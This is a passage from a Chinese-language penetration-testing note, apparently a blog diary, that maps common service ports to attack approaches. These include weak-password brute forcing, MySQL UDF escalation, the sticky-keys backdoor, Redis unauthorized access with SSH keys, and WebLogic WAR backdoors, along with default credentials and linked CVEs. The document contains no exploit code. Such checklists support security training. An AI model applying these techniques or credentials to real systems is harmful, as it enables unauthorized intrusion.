+<h3 id="3306"><a href="#3306" class="headerlink" title="# 3306"></a><a href="https://edu.yijinglab.com/post/280#3306">#</a> 3306</h3><p>3306是MYSQL数据库默认的监听端口，通常部署在中型web系统中。在国内LAMP的配置是非常流行的，对于php+mysql构架的攻击也是属于比较热门的话题。mysql数据库允许用户使用自定义函数功能，这使得黑客可编写恶意的自定义函数对服务器进行渗透，最后取得服务器最高权限。对于3306端口的渗透，黑客的方法如下:</p>
+<p>（1）由于管理者安全意识淡薄，通常管理密码设置过于简单，甚至为空口令。使用破解软件很容易破解此类密码，利用破解的密码登录远程mysql数据库，上传构造的恶意UDF自定义函数代码进行注册，通过调用注册的恶意函数执行系统命令。或者向web目录导出恶意的脚本程序，以控制整个web系统。</p>
+<p>（2）功能强大的‘cain’同样支持对3306端口的嗅探，同时嗅探也是渗透思路的一种。</p>
+<p>（3）SQL注入同样对mysql数据库威胁巨大，不仅可以获取数据库的敏感信息，还可使用load_file()函数读取系统的敏感配置文件或者从web数据库链接文件中获得root口令等，导出恶意代码到指定路径等。</p>
+<h3 id="3389"><a href="#3389" class="headerlink" title="# 3389"></a><a href="https://edu.yijinglab.com/post/280#3389">#</a> 3389</h3><p>3389是windows远程桌面服务默认监听的端口，管理员通过远程桌面对服务器进行维护，这给管理工作带来的极大的方便。通常此端口也是黑客们较为感兴趣的端口之一，利用它可对远程服务器进行控制，而且不需要另外安装额外的软件，实现方法比较简单。当然这也是系统合法的服务，通常是不会被杀毒软件所查杀的。使用‘输入法漏洞’进行渗透。</p>
+<p>（1）对于windows2000的旧系统版本，使用‘输入法漏洞’进行渗透。</p>
+<p>（2）cain是一款超级的渗透工具，同样支持对3389端口的嗅探。</p>
+<p>（3）Shift粘滞键后门：5次shift后门</p>
+<p>（4）社会工程学通常是最可怕的攻击技术，如果管理者的一切习惯和规律被黑客摸透的话，那么他管理的网络系统会因为他的弱点被渗透。</p>
+<p>（5）爆破3389端口。这里还是推荐使用hydra爆破工具。</p>
+<p>（6）ms12_020死亡蓝屏攻击。（<a href="https://www.cnblogs.com/R-Hacker/p/9178066.html）">https://www.cnblogs.com/R-Hacker/p/9178066.html）</a></p>
+<p>（7）<a href="https://www.cnblogs.com/backlion/p/9429738.html">https://www.cnblogs.com/backlion/p/9429738.html</a></p>
+<h3 id="4899"><a href="#4899" class="headerlink" title="# 4899"></a><a href="https://edu.yijinglab.com/post/280#4899">#</a> 4899</h3><p>4899端口是remoteadministrator远程控制软件默认监听的端口，也就是平时常说的radmini影子。radmini目前支持TCP/IP协议，应用十分广泛，在很多服务器上都会看到该款软件的影子。对于此软件的渗透，思路如下：</p>
+<p>（1）radmini同样存在不少弱口令的主机，通过专用扫描器可探测到此类存在漏洞的主机。</p>
+<p>（2）radmini远控的连接密码和端口都是写入到注册表系统中的，通过使用webshell注册表读取功能可读取radmini在注册表的各项键值内容，从而破解加密的密码散列。</p>
+<h3 id="5432"><a href="#5432" class="headerlink" title="# 5432"></a><a href="https://edu.yijinglab.com/post/280#5432">#</a> 5432</h3><p>PostgreSQL是一种特性非常齐全的自由软件的对象–关系型数据库管理系统，可以说是目前世界上最先进，功能最强大的自由数据库管理系统。包括kali系统中msf也使用这个数据库；浅谈postgresql数据库攻击技术 大部分关于它的攻击依旧是sql注入，所以注入才是数据库不变的话题。</p>
+<p>（1）爆破：弱口令：postgres postgres</p>
+<p>（2）缓冲区溢出：CVE-2014-2669。（<a href="http://drops.xmd5.com/static/drops/tips-6449.html）">http://drops.xmd5.com/static/drops/tips-6449.html）</a></p>
+<p>（3）远程代码执行：CVE-2018-1058。（<a href="https://www.secpulse.com/archives/69153.html）">https://www.secpulse.com/archives/69153.html）</a></p>
+<h3 id="5631"><a href="#5631" class="headerlink" title="# 5631"></a><a href="https://edu.yijinglab.com/post/280#5631">#</a> 5631</h3><p>5631端口是著名远程控制软件pcanywhere的默认监听端口，同时也是世界领先的远程控制软件。利用此软件，用户可以有效管理计算机并快速解决技术支持问题。由于软件的设计缺陷，使得黑客可随意下载保存连接密码的*.cif文件，通过专用破解软件进行破解。这些操作都必须在拥有一定权限下才可完成，至少通过脚本渗透获得一个webshell。通常这些操作在黑客界被称为pcanywhere提权技术。</p>
+<p>PcAnyWhere提权。<a href="https://blog.csdn.net/Fly_hps/article/details/80377199">https://blog.csdn.net/Fly_hps/article/details/80377199</a></p>
+<h3 id="5900"><a href="#5900" class="headerlink" title="# 5900"></a><a href="https://edu.yijinglab.com/post/280#5900">#</a> 5900</h3><p>5900端口是优秀远程控制软件VNC的默认监听端口，此软件由著名的AT&amp;T的欧洲研究实验室开发的。VNC是在基于unix和linux操作系统的免费的开放源码软件，远程控制能力强大，高效实用，其性能可以和windows和MAC中的任何一款控制软件媲美。对于该端口的渗透，思路如下：</p>
+<p>（1）VNC软件存在密码验证绕过漏洞，此高危漏洞可以使得恶意攻击者不需要密码就可以登录到一个远程系统。</p>
+<p>（2）cain同样支持对VNC的嗅探，同时支持端口修改。</p>
+<p>（3）VNC的配置信息同样被写入注册表系统中，其中包括连接的密码和端口。利用webshell的注册表读取功能进行读取加密算法，然后破解。</p>
+<p>（4）VNC拒绝服务攻击（CVE-2015-5239）</p>
+<p>（5）VNC权限提升（CVE-2013-6886）</p>
+<h3 id="6379"><a href="#6379" class="headerlink" title="# 6379"></a><a href="https://edu.yijinglab.com/post/280#6379">#</a> 6379</h3><p>Redis是一个开源的使用c语言写的，支持网络、可基于内存亦可持久化的日志型、key-value数据库。关于这个数据库这两年还是很火的，暴露出来的问题也很多。特别是前段时间暴露的未授权访问。</p>
+<p>（1）爆破：弱口令</p>
+<p>（2）未授权访问+配合ssh key提权。（<a href="http://www.alloyteam.com/2017/07/12910/）">http://www.alloyteam.com/2017/07/12910/）</a></p>
+<h3 id="7001-7002"><a href="#7001-7002" class="headerlink" title="# 7001/7002"></a><a href="https://edu.yijinglab.com/post/280#70017002">#</a> 7001/7002</h3><p>7001/7002通常是weblogic中间件端口</p>
+<p>（1）弱口令、爆破，弱密码一般为weblogic/Oracle@123 or weblogic</p>
+<p>（2）管理后台部署 war 后门</p>
+<p>（3）SSRF</p>
+<p>（4）反序列化漏洞</p>
+<p>（5）weblogic_uac</p>
+<blockquote>
+<p><a href="https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</a></p>
+<p><a href="https://bbs.pediy.com/thread-224954.htm">https://bbs.pediy.com/thread-224954.htm</a></p>
+<p><a href="https://fuping.site/2017/06/05/Weblogic-Vulnerability-Verification/">https://fuping.site/2017/06/05/Weblogic-Vulnerability-Verification/</a></p>
+<p><a href="https://blog.gdssecurity.com/labs/2015/3/30/weblogic-ssrf-and-xss-cve-2014-4241-cve-2014-4210-cve-2014-4.html">https://blog.gdssecurity.com/labs/2015/3/30/weblogic-ssrf-and-xss-cve-2014-4241-cve-2014-4210-cve-2014-4.html</a></p>
+</blockquote>
+<h3 id="8080"><a href="#8080" class="headerlink" title="# 8080"></a><a href="https://edu.yijinglab.com/post/280#8080">#</a> 8080</h3><p>8080端口通常是apache_Tomcat服务器默认监听端口，apache是世界使用排名第一的web服务器。国内很多大型系统都是使用apache服务器，对于这种大型服务器的渗透，主要有以下方法：</p>
+<p>（1）Tomcat远程代码执行漏洞 <a href="https://www.freebuf.com/column/159200.html">https://www.freebuf.com/column/159200.html</a></p>
+<p>（2）Tomcat任意文件上传。<a href="http://liehu.tass.com.cn/archives/836">http://liehu.tass.com.cn/archives/836</a></p>
+<p>（3）Tomcat远程代码执行&amp;信息泄露。<a href="https://paper.seebug.org/399/">https://paper.seebug.org/399/</a></p>
+<p>（4）Jboss远程代码执行 <a href="http://mobile.www.cnblogs.com/Safe3/archive/2010/01/08/1642371.html">http://mobile.www.cnblogs.com/Safe3/archive/2010/01/08/1642371.html</a></p>
+<p>（5）Jboss反序列化漏洞。<a href="https://www.zybuluo.com/websec007/note/838374">https://www.zybuluo.com/websec007/note/838374</a></p>
+<p>（6）Jboss漏洞利用。<a href="https://blog.csdn.net/u011215939/article/details/79141624">https://blog.csdn.net/u011215939/article/details/79141624</a></p>
+<h3 id="27017"><a href="#27017" class="headerlink" title="# 27017"></a><a href="https://edu.yijinglab.com/post/280#27017">#</a> 27017</h3><p>MongoDB，NoSQL数据库；攻击方法与其他数据库类似</p>
+<p>（1）爆破：弱口令</p>
+<p>（2）未授权访问；（<a href="http://www.cnblogs.com/LittleHann/p/6252421.html）">http://www.cnblogs.com/LittleHann/p/6252421.html）</a></p>
+<p>（3）<a href="http://www.tiejiang.org/19157.html">http://www.tiejiang.org/19157.html</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rsync:rsync 是一个常用的 Linux 应用程序，用于文件同步。</span><br><span class="line">873端口</span><br><span class="line">它可以在本地计算机与远程计算机之间，或者两个本地目录之间同步文件（但不支持两台远程计算机之间的同步）。它也可以当作文件复制工具，替代cp和mv命令。</span><br><span class="line">它名称里面的r指的是 remote，rsync 其实就是&quot;远程同步&quot;（remote sync）的意思。与其他文件传输工具（如 FTP 或 scp）不同，rsync 的最大特点是会检查发送方和接收方已有的文件，仅传输有变动的部分（默认规则是文件大小或修改时间有变动）。</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Socks5:sosks代理服务协议默认的服务端口号，用于监听传入的连接请求。 当一个客户端应用程序需要使用Sock5代理连接远程服务器时，它将会通过1080端口向代理服务器发送连接请求。</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IBM Lotus Domino 是一款服务器产品，可提供企业级电子邮件、协作功能和自定义应用程序平台</span><br><span class="line">是一款由 IBM Software Group 开发并销售的协作式客户端-服务器应用程序</span><br><span class="line">1352端口</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zookeeper开放源码的分布式应用程序协同服务</span><br><span class="line">2181端口</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">glassfish是一款web应用服务器，和tomcat一样，也是一款优秀的Servlet容器。</span><br><span class="line">端口4848</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pcanywhere：远程桌面连接</span><br><span class="line">5632端口</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vnc：虚拟网络控制台；远程控制工具</span><br><span class="line">端口5900</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zabbix：监控网络</span><br><span class="line">端口8069</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">websphere：中间件</span><br><span class="line">端口9090</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">elasticsearch：搜索和数据分析引擎</span><br><span class="line">端口9200/9300</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MemCache：自由、源码开放、高性能、分布式的分布式内存对象缓存系统</span><br><span class="line">端口11211</span><br></pre></td></tr></table></figure>
+]]></content>
+      <tags>
+        <tag>日记</tag>
+        <tag>渗透</tag>
+        <tag>常见端口</tag>
+      </tags>
   </entry>
 </search>
